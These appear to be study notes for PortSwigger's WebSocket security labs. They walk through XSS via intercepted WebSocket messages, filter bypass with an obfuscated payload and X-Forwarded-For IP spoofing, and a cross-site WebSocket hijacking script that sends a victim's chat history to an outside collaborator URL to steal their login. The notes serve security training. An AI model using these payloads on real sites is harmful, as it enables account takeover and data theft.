# Web Sockets Notes

[Portswigger](https://portswigger.net/web-security/websockets)

## Methodology

- intercept websocket traffic and input xss payloads to test
- check for how the chat reloads past chat history with no csrf tokens being used
- if blocked based on IP user the `X-Forwarded-For: 1.1.1.1` header to spoof IP address

## Labs Walkthrough

### Manipulating WebSocket messages to exploit vulnerabilities

Background:  
```This online shop has a live chat feature implemented using WebSockets. Chat messages that you submit are viewed by a support agent in real time. To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser```

- click `live chat` and send a message
- in burp go to the websockets history tab and observe that the chat message has been sent via a websocket message
- send a new message containing a `<` character
- in burp notice the `<` character has been HTML encoded by the client before sending
- put on burp intercept and send another message
- change the value of the intercepted message with `<img src=1 onerror='alert(1)'>` and forward it

### Cross-site WebSocket hijacking

Background: ```To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account. ```

- click `live chat` and send a message
- reload the page
- in proxy observe in the websockets history tab the `"READY"` command retrieves past chat messages from the server
- find the websocket handshake request and observe no csrf tokens are used
- right click on the handshake and select `Copy URL`
- in the browser go to exploit server and paste the following template into the `Body` section:

```
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

- click view exploit
- poll for interactions in collaborator to validate the attack is successful
- deliver exploit to victim
- poll collaborator and find the victims creds to log in as them

### Manipulating the WebSocket handshake to exploit vulnerabilities

background:  ```It has an aggressive but flawed XSS filter. To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser```

- click `live chat` and send a message
- In Burp Proxy, go to the WebSockets history tab, and observe that the chat message has been sent via a WebSocket message
- send this request to repeater and send a basic xss payload in the message `<img src=1 onerror='alert(1)'>`
- observe we get blocked
- click `reconnect` and observe the connection attempt fails because your IP address has been banned
- add this header to spoof our IP address `X-Forwarded-For: 1.1.1.1`
- click connect to reconnect
- send this obfuscated payload `<img src=1 oNeRrOr=alert`1`>`
